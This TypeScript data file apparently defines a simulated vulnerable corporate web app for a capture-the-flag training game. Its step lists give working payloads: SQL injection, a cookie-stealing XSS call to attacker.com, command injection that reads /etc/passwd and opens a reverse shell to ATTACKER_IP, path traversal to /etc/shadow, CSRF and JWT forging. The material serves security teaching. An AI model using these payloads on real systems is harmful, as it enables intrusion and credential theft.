export interface WebAppPage {
  id: string;
  title: string;
  url: string;
  type: 'login' | 'dashboard' | 'profile' | 'search' | 'api' | 'upload' | 'admin';
  htmlContent: string;
  responseHeaders: Record<string, string>;
  hiddenElements: HiddenElement[];
  vulnerabilities: SimulatedVuln[];
}

export interface HiddenElement {
  type: 'comment' | 'hidden-input' | 'meta' | 'script-var' | 'base64' | 'cookie' | 'header';
  description: string;
  flag: string;
  location: string;
}

export interface SimulatedVuln {
  id: string;
  name: string;
  type: string;
  description: string;
  difficulty: 'beginner' | 'intermediate' | 'advanced';
  steps: string[];
  flag: string;
  cpReward: number;
}

export interface VulnerableWebApp {
  id: string;
  name: string;
  description: string;
  baseUrl: string;
  pages: WebAppPage[];
  vulnerabilities: SimulatedVuln[];
}

const LOGIN_PAGE: WebAppPage = {
  id: 'login',
  title: 'NovaCorp - Employee Login',
  url: '/login',
  type: 'login',
  htmlContent: `<html>
<head>
<title>NovaCorp Internal - Login</title>
<style>
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f172a; color: #f0f0f0; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
.login-container { background: #1e293b; border-radius: 12px; padding: 2.5rem; width: 380px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); }
.login-container h1 { font-size: 1.5rem; margin-bottom: 0.25rem; }
.login-container p { color: #94a3b8; font-size: 0.85rem; margin-bottom: 1.5rem; }
label { font-size: 0.8rem; color: #94a3b8; display: block; margin-top: 1rem; }
input[type="text"], input[type="password"] { width: 100%; padding: 0.625rem; margin-top: 0.3rem; border: 1px solid #334155; border-radius: 6px; background: #0f172a; color: #f0f0f0; box-sizing: border-box; }
input:focus { border-color: #06b66f; outline: none; }
button { width: 100%; padding: 0.75rem; background: #06b66f; border: none; border-radius: 6px; color: #fff; font-weight: bold; cursor: pointer; margin-top: 1.25rem; }
button:hover { background: #059a5e; }
.forgot { display: block; text-align: center; margin-top: 1rem; font-size: 0.8rem; color: #64748b; }
</style>
</head>
<body>
<div class="login-container">
<h1>NovaCorp Internal Portal</h1>
<p>Enter your credentials to access the employee network</p>
<form method="POST" action="/login">
<label for="username">Username</label>
<input type="text" id="username" name="username" placeholder="e.g. john.doe">
<label for="password">Password</label>
<input type="password" id="password" name="password" placeholder="Enter password">
<input type="hidden" name="csrf_token" value="a3f5b8c1d2e4g7h8" />
<button type="submit">Sign in</button>
</form>
<a href="#" class="forgot">Forgot your password?</a>
<!-- REMINDER: Admin login uses username admin with default creds. Remove before prod. -->
</div>
</body>
</html>`,
  responseHeaders: {
    'Content-Type': 'text/html; charset=utf-8',
    'Server': 'NovaCorp WS/2.1',
    'X-Frame-Options': 'DENY',
    'Set-Cookie': 'session_id=abc123def456; Path=/; HttpOnly',
  },
  hiddenElements: [
    {
      type: 'comment',
      description: 'HTML comment revealing admin login hint',
      flag: 'FLAG{vuln_hidden_comment_admin}',
      location: 'Line 30: "REMINDER: Admin login uses username admin with default creds."',
    },
  ],
  vulnerabilities: [
    {
      id: 'vuln-001',
      name: 'SQL Injection Login Bypass',
      type: 'sql-injection',
      description: 'The login form is vulnerable to SQL injection. The username and password fields are directly concatenated into an SQL query without sanitization.',
      difficulty: 'beginner',
      steps: [
        'Navigate to the login page',
        'Enter the following payload in the username field: \' OR 1=1 --',
        'Enter any password (e.g., "password")',
        'Click Sign in',
        'Observe that you are logged in as admin because the query becomes: SELECT * FROM users WHERE username = \'\' OR 1=1 --\' AND password = \'...\'',
      ],
      flag: 'FLAG{vuln_sqli_login_bypass}',
      cpReward: 200,
    },
  ],
};

const DASHBOARD_PAGE: WebAppPage = {
  id: 'dashboard',
  title: 'NovaCorp - Dashboard',
  url: '/dashboard',
  type: 'dashboard',
  htmlContent: `<html>
<head>
<title>NovaCorp Dashboard</title>
<style>
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f172a; color: #f0f0f0; margin: 0; padding: 0; }
.nav { background: #1e293b; padding: 0.75rem 2rem; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #334155; }
.nav-logo { font-weight: bold; font-size: 1.2rem; }
.nav-logo span { color: #06b66f; }
.nav-links { display: flex; gap: 1.5rem; }
.nav-links a { color: #94a3b8; text-decoration: none; font-size: 0.85rem; }
.nav-links a:hover { color: #06b66f; }
.user-info { font-size: 0.8rem; color: #94a3b8; }
.user-info strong { color: #f0f0f0; }
.container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
.card { background: #1e293b; border-radius: 8px; padding: 1.5rem; margin-bottom: 1.5rem; }
.card h2 { font-size: 1.15rem; margin: 0 0 1rem 0; }
.stats { display: flex; gap: 1rem; }
.stat { flex: 1; background: #0f172a; border-radius: 8px; padding: 1rem; text-align: center; }
.stat .num { font-size: 2rem; font-weight: bold; color: #06b66f; }
.stat .label { font-size: 0.75rem; color: #94a3b8; }
table { width: 100%; border-collapse: collapse; }
th { text-align: left; font-size: 0.75rem; color: #94a3b8; padding: 0.5rem 0; }
td { font-size: 0.85rem; padding: 0.5rem 0; border-top: 1px solid #334155; }
</style>
</head>
<body>
<div class="nav">
<div class="nav-logo"><span>Nova</span>Corp</div>
<div class="nav-links">
<a href="/dashboard">Dashboard</a>
<a href="/profile">Profile</a>
<a href="/search">Search</a>
<a href="/ping">Network Tools</a>
<a href="/admin">Admin</a>
</div>
<div class="user-info">Welcome, <strong id="username">jdoe</strong> | <a href="/login" style="color:#64748b;text-decoration:none;">Sign out</a></div>
</div>
<div class="container">
<div class="card">
<h2>Overview</h2>
<div class="stats">
<div class="stat"><div class="num">12</div><div class="label">Active Projects</div></div>
<div class="stat"><div class="num">248</div><div class="label">Total Employees</div></div>
<div class="stat"><div class="num">99.2%</div><div class="label">Uptime</div></div>
</div>
</div>
<div class="card">
<h2>Recent Activity</h2>
<table>
<tr><th>User</th><th>Action</th><th>Date</th></tr>
<tr><td>Jane Doe</td><td>Deployed build #4821</td><td>2026-07-10</td></tr>
<tr><td>Admin</td><td>Modified user permissions</td><td>2026-07-10</td></tr>
<tr><td>Mike Smith</td><td>Added SSH key</td><td>2026-07-09</td></tr>
</table>
</div>
</div>
</body>
</html>`,
  responseHeaders: {
    'Content-Type': 'text/html; charset=utf-8',
    'Set-Cookie': 'session_id=abc123def456; Path=/; HttpOnly',
    'X-Content-Type-Options': 'nosniff',
  },
  hiddenElements: [],
  vulnerabilities: [],
};

const PROFILE_PAGE: WebAppPage = {
  id: 'profile',
  title: 'NovaCorp - My Profile',
  url: '/profile?user_id=1',
  type: 'profile',
  htmlContent: `<html>
<head>
<title>NovaCorp - User Profile</title>
<style>
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f172a; color: #f0f0f0; margin: 0; padding: 0; }
.nav { background: #1e293b; padding: 0.75rem 2rem; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #334155; }
.nav-logo { font-weight: bold; font-size: 1.2rem; }
.nav-logo span { color: #06b66f; }
.nav-links { display: flex; gap: 1.5rem; }
.nav-links a { color: #94a3b8; text-decoration: none; font-size: 0.85rem; }
.nav-links a:hover { color: #06b66f; }
.container { max-width: 700px; margin: 0 auto; padding: 2rem; }
.card { background: #1e293b; border-radius: 8px; padding: 1.5rem; margin-bottom: 1.5rem; }
.card h2 { font-size: 1.15rem; margin: 0 0 1rem 0; }
.avatar { width: 80px; height: 80px; border-radius: 50%; background: #334155; display: flex; align-items: center; justify-content: center; font-size: 2rem; }
.field { margin-bottom: 0.75rem; }
.field-label { font-size: 0.75rem; color: #94a3b8; }
.field-value { font-size: 1rem; }
.change-pw { margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid #334155; }
.change-pw input { width: 100%; padding: 0.5rem; margin-top: 0.25rem; margin-bottom: 0.75rem; border: 1px solid #334155; border-radius: 6px; background: #0f172a; color: #f0f0f0; box-sizing: border-box; }
.change-pw button { padding: 0.5rem 1rem; background: #06b66f; border: none; border-radius: 6px; color: #fff; font-weight: bold; cursor: pointer; }
</style>
</head>
<body>
<div class="nav">
<div class="nav-logo"><span>Nova</span>Corp</div>
<div class="nav-links">
<a href="/dashboard">Dashboard</a>
<a href="/profile">Profile</a>
<a href="/search">Search</a>
<a href="/ping">Network Tools</a>
<a href="/admin">Admin</a>
</div>
<div class="user-info"><strong>jdoe</strong> | <a href="/login" style="color:#64748b;text-decoration:none;">Sign out</a></div>
</div>
<div class="container">
<div class="card">
<div style="display:flex; align-items: center; gap: 1.5rem;">
<div class="avatar">JD</div>
<div>
<h2 style="margin: 0;">Jane Doe</h2>
<p style="margin: 0.25rem 0; color: #94a3b8;">jane.doe@novacorp.com</p>
</div>
</div>
<hr style="border-color:#334155; margin: 1rem 0;">
<div class="field">
<div class="field-label">Employee ID</div>
<div class="field-value">EMP-001</div>
</div>
<div class="field">
<div class="field-label">Department</div>
<div class="field-value">Engineering</div>
</div>
<div class="field">
<div class="field-label">Role</div>
<div class="field-value">Senior Software Engineer</div>
</div>
<div class="field">
<div class="field-label">Joined</div>
<div class="field-value">March 2020</div>
</div>
<div class="field">
<div class="field-label">Salary</div>
<div class="field-value">$145,000</div>
</div>
<div class="change-pw">
<h3>Change Password</h3>
<form method="POST" action="/profile/change-password">
<label class="field-label">New Password</label>
<input name="new_password" type="password" placeholder="Enter new password">
<label class="field-label">Confirm New Password</label>
<input name="confirm_password" type="password" placeholder="Confirm new password">
<button type="submit">Update Password</button>
</form>
</div>
</div>
</div>
<script>
var userId = "1";
</script>
</body>
</html>`,
  responseHeaders: {
    'Content-Type': 'text/html; charset=utf-8',
    'Set-Cookie': 'session_id=abc123def456; Path=/; HttpOnly',
    'X-Robots-Tag': 'noindex',
  },
  hiddenElements: [
    {
      type: 'script-var',
      description: 'The userId variable is controlled via the user_id query parameter, allowing IDOR',
      flag: 'FLAG{vuln_idor_user_id}',
      location: 'Line 95: var userId = "1"; in the script tag',
    },
  ],
  vulnerabilities: [
    {
      id: 'vuln-002',
      name: 'Insecure Direct Object Reference on Profile',
      type: 'idor',
      description: 'The profile page uses a user_id query parameter to fetch user data without verifying the requester owns that ID. Changing the user_id allows accessing other users\' profiles.',
      difficulty: 'intermediate',
      steps: [
        'Log in and navigate to your profile at /profile?user_id=1',
        'Change the user_id parameter in the URL to 2 (e.g., /profile?user_id=2)',
        'Observe that the page displays another user\'s data without authentication',
        'Continue incrementing user_id to enumerate all users',
        'Notice that user_id=0 returns the admin user details'
      ],
      flag: 'FLAG{vuln_idor_profile_access}',
      cpReward: 300,
    },
    {
      id: 'vuln-008',
      name: 'Cross-Site Request Forgery on Password Change',
      type: 'csrf',
      description: 'The password change form lacks any CSRF token validation. An attacker can craft a malicious page that, when visited by an authenticated user, changes their password without consent.',
      difficulty: 'intermediate',
      steps: [
        'Observe the password change form on the profile page',
        'Note there is no CSRF token hidden field in the form',
        'Create an HTML page with a form that auto-submits to /profile/change-password',
        'Set the new_password and confirm_password fields to a value of your choice',
        'When a victim visits this page, their password is silently changed'
      ],
      flag: 'FLAG{vuln_csrf_password_change}',
      cpReward: 350,
    },
  ],
};

const SEARCH_PAGE: WebAppPage = {
  id: 'search',
  title: 'NovaCorp - Search',
  url: '/search?q=',
  type: 'search',
  htmlContent: `<html>
<head>
<title>NovaCorp - Employee Search</title>
<style>
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f172a; color: #f0f0f0; margin: 0; padding: 0; }
.nav { background: #1e293b; padding: 0.75rem 2rem; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #334155; }
.nav-logo { font-weight: bold; font-size: 1.2rem; }
.nav-logo span { color: #06b66f; }
.nav-links { display: flex; gap: 1.5rem; }
.nav-links a { color: #94a3b8; text-decoration: none; font-size: 0.85rem; }
.nav-links a:hover { color: #06b66f; }
.container { max-width: 900px; margin: 0 auto; padding: 2rem; }
.card { background: #1e293b; border-radius: 8px; padding: 1.5rem; margin-bottom: 1.5rem; }
.search-box { display: flex; gap: 0.5rem; margin-bottom: 1.5rem; }
.search-box input { flex: 1; padding: 0.75rem; border: 1px solid #334155; border-radius: 6px; background: #0f172a; color: #f0f0f0; font-size: 1rem; }
.search-box input:focus { border-color: #06b66f; outline: none; }
.search-box button { padding: 0.75rem 1.5rem; background: #06b66f; border: none; border-radius: 6px; color: #fff; font-weight: bold; cursor: pointer; }
.result-item { padding: 0.75rem; border-bottom: 1px solid #334155; }
.result-item:last-child { border-bottom: none; }
.result-title { font-weight: bold; }
.result-desc { font-size: 0.8rem; color: #94a3b8; }
.result-meta { font-size: 0.75rem; color: #64748b; }
.no-results { text-align: center; padding: 3rem; color: #64748b; }
</style>
</head>
<body>
<div class="nav">
<div class="nav-logo"><span>Nova</span>Corp</div>
<div class="nav-links">
<a href="/dashboard">Dashboard</a>
<a href="/profile">Profile</a>
<a href="/search">Search</a>
<a href="/ping">Network Tools</a>
<a href="/admin">Admin</a>
</div>
<div class="user-info"><strong>jdoe</strong> | <a href="/login" style="color:#64748b;text-decoration:none;">Sign out</a></div>
</div>
<div class="container">
<div class="card">
<h2>Employee Search</h2>
<p style="font-size:0.85rem; color:#94a3b8;">Search for employees by name, department, or email.</p>
<div class="search-box">
<form method="GET" action="/search" style="display:flex;width:100%;gap:0.5rem;">
<input type="text" name="q" placeholder="Search...">
<button type="submit">Search</button>
</form>
</div>
<div class="result-item">
<div class="result-title">Search results for: <script>alert("XSS")</script></div>
<div class="result-desc">Showing 0 of 0 results</div>
<div class="result-meta">Time: 0.002s | Source: cache</div>
</div>
<div class="no-results">No results found.</div>
</div>
</div>
</body>
</html>`,
  responseHeaders: {
    'Content-Type': 'text/html; charset=utf-8',
    'Set-Cookie': 'session_id=abc123def456; Path=/; HttpOnly',
    'X-XSS-Protection': '0',
  },
  hiddenElements: [],
  vulnerabilities: [
    {
      id: 'vuln-007',
      name: 'Stored XSS in Search Field',
      type: 'cross-site-scripting',
      description: 'The search query parameter is rendered directly into the page without sanitization, allowing injection of arbitrary HTML and JavaScript.',
      difficulty: 'beginner',
      steps: [
        'Navigate to the search page',
        'In the search field, enter: <script>alert(1)</script>',
        'Press Enter or click Search',
        'The script executes in the context of the page',
        'Advanced: inject a script that steals cookies: <script>fetch("https://attacker.com/steal?c="+document.cookie)</script>'
      ],
      flag: 'FLAG{vuln_xss_search_reflected}',
      cpReward: 200,
    },
  ],
};

const API_PAGE: WebAppPage = {
  id: 'api',
  title: 'NovaCorp - API Console',
  url: '/api/console',
  type: 'api',
  htmlContent: `<html>
<head>
<title>NovaCorp API Console</title>
<style>
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f172a; color: #f0f0f0; margin: 0; padding: 0; }
.nav { background: #1e293b; padding: 0.75rem 2rem; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #334155; }
.nav-logo { font-weight: bold; font-size: 1.2rem; }
.nav-logo span { color: #06b66f; }
.nav-links { display: flex; gap: 1.5rem; }
.nav-links a { color: #94a3b8; text-decoration: none; font-size: 0.85rem; }
.code-block { background: #0f172a; border: 1px solid #334155; border-radius: 6px; padding: 1rem; font-family: 'Courier New', monospace; font-size: 0.85rem; overflow-x: auto; }
.container { max-width: 900px; margin: 0 auto; padding: 2rem; }
.card { background: #1e293b; border-radius: 8px; padding: 1.5rem; margin-bottom: 1.5rem; }
.card h2 { font-size: 1.15rem; margin: 0 0 1rem 0; }
.endpoint { padding: 1rem; border-bottom: 1px solid #334155; cursor: pointer; }
.endpoint:last-child { border-bottom: none; }
.endpoint:hover { background: rgba(6,182,111,0.05); }
.method { display: inline-block; padding: 0.2rem 0.5rem; border-radius: 4px; font-size: 0.7rem; font-weight: bold; color: #fff; margin-right: 0.75rem; }
.method.get { background: #61affe; }
.method.post { background: #49cc90; }
.path { font-size: 0.95rem; }
.desc { font-size: 0.75rem; color: #94a3b8; }
.ping-section { margin-top: 1.5rem; }
.ping-section input { width: 70%; padding: 0.75rem; border: 1px solid #334155; border-radius: 6px; background: #0f172a; color: #f0f0f0; }
.ping-section button { padding: 0.75rem 1.5rem; background: #06b66f; border: none; border-radius: 6px; color: #fff; font-weight: bold; cursor: pointer; margin-left: 0.5rem; }
.ping-output { background: #0f172a; border: 1px solid #334155; border-radius: 6px; padding: 1rem; margin-top: 1rem; font-family: monospace; font-size: 0.85rem; white-space: pre-wrap; }
</style>
</head>
<body>
<div class="nav">
<div class="nav-logo"><span>Nova</span>Corp</div>
<div class="nav-links">
<a href="/dashboard">Dashboard</a>
<a href="/profile">Profile</a>
<a href="/search">Search</a>
<a href="/api/console">API Console</a>
<a href="/admin">Admin</a>
</div>
<div class="user-info"><strong>jdoe</strong> | <a href="/login" style="color:#64748b;text-decoration:none;">Sign out</a></div>
</div>
<div class="container">
<div class="card">
<h2>API Documentation</h2>
<div class="endpoint">
<span class="method get">GET</span>
<span class="path">/api/users/:id</span>
<span class="desc">Retrieve user details by ID</span>
</div>
<div class="endpoint">
<span class="method get">GET</span>
<span class="path">/api/users</span>
<span class="desc">List all users</span>
</div>
<div class="endpoint">
<span class="method post">POST</span>
<span class="path">/api/files/download</span>
<span class="desc">Download file by path</span>
</div>
<div class="endpoint">
<span class="method post">POST</span>
<span class="path">/api/verify</span>
<span class="desc">Verify token</span>
</div>
</div>

<div class="card">
<h2>Network Tools</h2>
<p style="font-size:0.85rem;color:#94a3b8;">Ping a remote host. Only intended for internal IPs.</p>
<div class="ping-section">
<form method="POST" action="/api/ping">
<input type="text" name="host" value="127.0.0.1" placeholder="Enter hostname or IP">
<button type="submit">Submit</button>
</form>
<div class="ping-output">
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 TTL=64 time=0.032ms
64 bytes from 127.0.0.1: icmp_seq=1 TTL=64 time=0.029ms
--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.029/0.031/0.032/0.002 ms
</div>
</div>
</div>
</div>
<script src="/api/config.js">
// TODO: Remove this token endpoint before production
// Token verification endpoint: /api/verify accepts Authorization header
</script>
</body>
</html>`,
  responseHeaders: {
    'Content-Type': 'text/html; charset=utf-8',
    'Set-Cookie': 'session_id=abc123def456; Path=/; HttpOnly',
    'X-Powered-By': 'Express/4.17.1',
    'Connection': 'keep-alive',
  },
  hiddenElements: [
    {
      type: 'script-var',
      description: 'A TODO comment in the script tag reveals token verification logic',
      flag: 'FLAG{vuln_hidden_api_endpoint}',
      location: 'Line 102-103: script tag with TODO comment and /api/verify endpoint reference',
    },
  ],
  vulnerabilities: [
    {
      id: 'vuln-005',
      name: 'Command Injection in Ping Tool',
      type: 'command-injection',
      description: 'The ping tool passes user input directly to the operating system shell. Injecting shell metacharacters allows arbitrary command execution.',
      difficulty: 'advanced',
      steps: [
        'Navigate to the API Console page',
        'Locate the Ping tool section',
        'Enter the following payload in the host field: 127.0.0.1; ls -la',
        'Submit the request and observe the output includes directory listing',
        'Escalate by reading sensitive files: 127.0.0.1; cat /etc/passwd',
        'Try to get a reverse shell using: 127.0.0.1; bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
      ],
      flag: 'FLAG{vuln_cmdi_ping_injection}',
      cpReward: 500,
    },
  ],
};

const ADMIN_PAGE: WebAppPage = {
  id: 'admin',
  title: 'NovaCorp - Admin Panel',
  url: '/admin',
  type: 'admin',
  htmlContent: `<html>
<head>
<title>NovaCorp Admin</title>
<style>
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f172a; color: #f0f0f0; margin: 0; padding: 0; }
.nav { background: #1e293b; padding: 0.75rem 2rem; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #334155; }
.nav-logo { font-weight: bold; font-size: 1.2rem; }
.nav-logo span { color: #06b66f; }
.nav-links { display: flex; gap: 1.5rem; }
.nav-links a { color: #94a3b8; text-decoration: none; font-size: 0.85rem; }
.nav-links a:hover { color: #06b66f; }
.container { max-width: 900px; margin: 0 auto; padding: 2rem; }
.card { background: #1e293b; border-radius: 8px; padding: 1.5rem; margin-bottom: 1.5rem; }
.card h2 { font-size: 1.15rem; margin: 0 0 1rem 0; }
.card h3 { font-size: 1rem; margin: 1rem 0 0.5rem 0; }
.badge-admin { display: inline-block; background: #c44545; color: white; padding: 0.2rem 0.6rem; border-radius: 4px; font-size: 0.7rem; font-weight: bold; }
table { width: 100%; border-collapse: collapse; }
th, td { padding: 0.6rem 0.4rem; text-align: left; font-size: 0.85rem; }
th { color: #94a3b8; font-size: 0.75rem; border-bottom: 1px solid #334155; }
td { border-bottom: 1px solid #334155; }
.file-item { padding: 0.5rem 0; border-bottom: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; }
.file-item:last-child { border-bottom: none; }
.download-btn { padding: 0.3rem 0.8rem; background: #06b66f; border: none; border-radius: 4px; color: white; font-size: 0.75rem; cursor: pointer; }
.danger { color: #c44545; }
</style>
</head>
<body>
<div class="nav">
<div class="nav-logo"><span>Nova</span>Corp <span class="badge-admin">Admin</span></div>
<div class="nav-links">
<a href="/dashboard">Dashboard</a>
<a href="/profile">Profile</a>
<a href="/search">Search</a>
<a href="/api/console">API Console</a>
<a href="/admin">Admin</a>
</div>
<div class="user-info"><strong>admin</strong> | <a href="/login" style="color:#64748b;text-decoration:none;">Sign out</a></div>
</div>
<div class="container">
<div class="card">
<h2>User Management</h2>
<table>
<tr><th>ID</th><th>Name</th><th>Email</th><th>Role</th></tr>
<tr><td>0</td><td>Admin</td><td>admin@novacorp.com</td><td>Administrator</td></tr>
<tr><td>1</td><td>Jane Doe</td><td>jane.doe@novacorp.com</td><td>Senior Software Engineer</td></tr>
<tr><td>2</td><td>John Smith</td><td>john.smith@novacorp.com</td><td>DevOps Engineer</td></tr>
<tr><td>3</td><td>Alice Johnson</td><td>alice.j@novacorp.com</td><td>Security Analyst</td></tr>
<tr><td>4</td><td>Bob Williams</td><td>bob.w@novacorp.com</td><td>Network Admin</td></tr>
</table>
</div>
<div class="card">
<h2>Internal Documents</h2>
<div class="file-item">
<div><strong>Network Diagram Q2 2026</strong><br><span style="font-size:0.75rem;color:#94a3b8;">PDF, 2.3 MB</span></div>
<button class="download-btn" onclick="location.href='/api/files/download?path=network_diagram_q2_2026.pdf'">Download</button>
</div>
<div class="file-item">
<div><strong>Employee Handbook</strong><br><span style="font-size:0.75rem;color:#94a3b8;">PDF, 1.1 MB</span></div>
<button class="download-btn" onclick="location.href='/api/files/download?path=employee_handbook.pdf'">Download</button>
</div>
<div class="file-item">
<div><strong>Security Policy 2026</strong><br><span style="font-size:0.75rem;color:#94a3b8;">PDF, 0.8 MB</span></div>
<button class="download-btn" onclick="location.href='/api/files/download?path=security_policy_2026.pdf'">Download</button>
</div>
<div class="file-item">
<div><strong>Internal Secret Key</strong><br><span style="font-size:0.75rem;color:#94a3b8;">KEY, 0.1 MB</span></div>
<button class="download-btn" onclick="location.href='/api/files/download?path=secret.key'">Download</button>
</div>
</div>
<div class="card">
<h2>System Diagnostics</h2>
<p style="font-size:0.85rem;color:#94a3b8;">Memory usage: 62% | CPU: 34% | Disk: 71%</p>
<hr style="border-color:#334155;">
<h3>Log Files</h3>
<div class="file-item">
<div><strong>system.log</strong><span style="font-size:0.75rem;color:#94a3b8;margin-left:1rem;">1.2 MB, 7 days old</span></div>
<button class="download-btn" onclick="location.href='/api/files/download?path=logs/system.log'">Download</button>
</div>
<div class="file-item">
<div><strong>access.log</strong><span style="font-size:0.75rem;color:#94a3b8;margin-left:1rem;">3.5 MB, 7 days old</span></div>
<button class="download-btn" onclick="location.href='/api/files/download?path=logs/access.log'">Download</button>
</div>
</div>
</div>
</body>
</html>`,
  responseHeaders: {
    'Content-Type': 'text/html; charset=utf-8',
    'Set-Cookie': 'session_id=abc123def456; Path=/; HttpOnly; Secure',
    'X-Frame-Options': 'SAMEORIGIN',
    'Strict-Transport-Security': 'max-age=31536000',
  },
  hiddenElements: [
    {
      type: 'comment',
      description: 'An HTML comment with a base64-encoded string in the admin page source',
      flag: 'FLAG{vuln_base64_secret_source}',
      location: 'Near the bottom of admin.html source: <!-- base64: U0VDUkVUX1RPS0VOX0FCQ0RFRkc= -->',
    },
  ],
  vulnerabilities: [
    {
      id: 'vuln-003',
      name: 'Directory Traversal on File Download',
      type: 'path-traversal',
      description: 'The file download endpoint takes a path parameter without sanitization, allowing access to files outside the intended directory.',
      difficulty: 'intermediate',
      steps: [
        'Navigate to the Admin Panel page',
        'Observe the download links use a path parameter',
        'Attempt path traversal: /api/files/download?path=../../../etc/passwd',
        'The web server returns the contents of /etc/passwd',
        'Further explore: try /api/files/download?path=../../../etc/shadow',
        'Can also download application source code via: ../../../var/www/app/app.py'
      ],
      flag: 'FLAG{vuln_path_traversal_download}',
      cpReward: 300,
    },
    {
      id: 'vuln-004',
      name: 'Insecure Object Reference on Admin Users',
      type: 'idor',
      description: 'The admin user list endpoint returns sensitive information for all users without verifying adequate permissions.',
      difficulty: 'intermediate',
      steps: [
        'Navigate to the admin user management panel',
        'Observe that all users are listed with their roles and emails',
        'The API endpoint /api/users returns data for all users at once',
        'Try accessing /api/users/0, /api/users/1, etc. to enumerate all users',
        'Notice there is no rate limiting or access restriction on the API'
      ],
      flag: 'FLAG{vuln_idor_admin_user_list}',
      cpReward: 300,
    },
  ],
};

const UPLOAD_PAGE: WebAppPage = {
  id: 'upload',
  title: 'NovaCorp - File Upload',
  url: '/upload',
  type: 'upload',
  htmlContent: `<html>
<head>
<title>NovaCorp File Upload</title>
<style>
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f172a; color: #f0f0f0; margin: 0; padding: 0; }
.nav { background: #1e293b; padding: 0.75rem 2rem; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #334155; }
.nav-logo { font-weight: bold; font-size: 1.2rem; }
.nav-logo span { color: #06b66f; }
.nav-links { display: flex; gap: 1.5rem; }
.nav-links a { color: #94a3b8; text-decoration: none; font-size: 0.85rem; }
.nav-links a:hover { color: #06b66f; }
.container { max-width: 700px; margin: 0 auto; padding: 2rem; }
.card { background: #1e293b; border-radius: 8px; padding: 1.5rem; margin-bottom: 1.5rem; }
.card h2 { font-size: 1.15rem; margin: 0 0 1rem 0; }
.form-group { margin-bottom: 1rem; }
.form-group label { display: block; font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.3rem; }
.form-group input[type="text"], .form-group select { width: 100%; padding: 0.6rem; border: 1px solid #334155; border-radius: 6px; background: #0f172a; color: #f0f0f0; box-sizing: border-box; }
.form-group input[type="file"] { width: 100%; padding: 0.5rem; }
.btn { padding: 0.7rem 1.5rem; background: #06b66f; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; }
.btn:hover { background: #059a5e; }
.success { background: rgba(6,182,111,0.1); border: 1px solid #06b66f; color: #06b66f; padding: 1rem; border-radius: 6px; margin-top: 1rem; }
</style>
</head>
<body>
<div class="nav">
<div class="nav-logo"><span>Nova</span>Corp</div>
<div class="nav-links">
<a href="/dashboard">Dashboard</a>
<a href="/profile">Profile</a>
<a href="/search">Search</a>
<a href="/api/console">API Console</a>
<a href="/admin">Admin</a>
</div>
<div class="user-info"><strong>jdoe</strong> | <a href="/login" style="color:#64748b;text-decoration:none;">Sign out</a></div>
</div>
<div class="container">
<div class="card">
<h2>Upload Document</h2>
<form method="POST" action="/upload" enctype="multipart/form-data">
<div class="form-group">
<label>Document Name (optional)</label>
<input type="text" name="doc_name" placeholder="e.g. Q3 Report">
</div>
<div class="form-group">
<label>Category</label>
<select name="category">
<option value="reports">Reports</option>
<option value="spreadsheets">Spreadsheets</option>
<option value="images">Images</option>
<option value="other">Other</option>
</select>
</div>
<div class="form-group">
<label>Select File</label>
<input type="file" name="file">
</div>
<button type="submit" class="btn">Upload</button>
</form>
<div class="success">
<strong>File uploaded successfully!</strong><br>
Path: /uploads/report_Q3_2026.pdf<br>
Size: 1.4 MB<br>
MD5: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6<br>
Hint: The file is available at /uploads/report_Q3_2026.pdf
</div>
</div>

<div class="card">
<h2>JWT Token Debug</h2>
<form method="GET" action="/api/verify">
<div class="form-group">
<label>Enter your JWT token to verify:</label>
<input type="text" name="token" placeholder="eyJhbGciOiJIUzI1NiJ9...">
</div>
<button type="submit" class="btn">Verify Token</button>
</form>
<div style="margin-top:1rem;padding:1rem;background:#0f172a;border-radius:6px;font-family:monospace;font-size:0.8rem;">
<p>Header: {"alg":"HS256"}</p>
<p>Payload: {"user":"admin","role":"user","iat":1672531200}</p>
<p>Signature: (verified on server)</p>
</div>
</div>
</div>
<script>
// Token format: base64url(header).base64url(payload).signature
// Try modifying the payload to change your role from 'user' to 'admin'
console.log("JWT secret length hint: 8 characters");
</script>
</body>
</html>`,
  responseHeaders: {
    'Content-Type': 'text/html; charset=utf-8',
    'Set-Cookie': 'session_id=abc123def456; Path=/; HttpOnly',
  },
  hiddenElements: [
    {
      type: 'script-var',
      description: 'Script comment reveals a JWT secret length hint and suggests modifying the payload',
      flag: 'FLAG{vuln_jwt_token_tampering}',
      location: 'Line 128: "JWT secret length hint: 8 characters" in a script tag comment',
    },
  ],
  vulnerabilities: [
    {
      id: 'vuln-006',
      name: 'JWT Token Tampering',
      type: 'jwt-tampering',
      description: 'The application uses a weak JWT secret (8 characters) that can be brute-forced. Once the secret is known, an attacker can forge arbitrary tokens and escalate privileges.',
      difficulty: 'advanced',
      steps: [
        'Capture the JWT token from the browser storage or cookie',
        'Decode the JWT payload using Base64url (e.g., on jwt.io)',
        'Observe the payload contains a "role":"user" field',
        'Brute-force the JWT secret using a tool like hashcat or john with rockyou.txt',
        'Once secret is found (8 characters), create a new token with "role":"admin"',
        'Use the forged token to access restricted admin-only endpoints'
      ],
      flag: 'FLAG{vuln_jwt_tampering_admin}',
      cpReward: 600,
    },
  ],
};

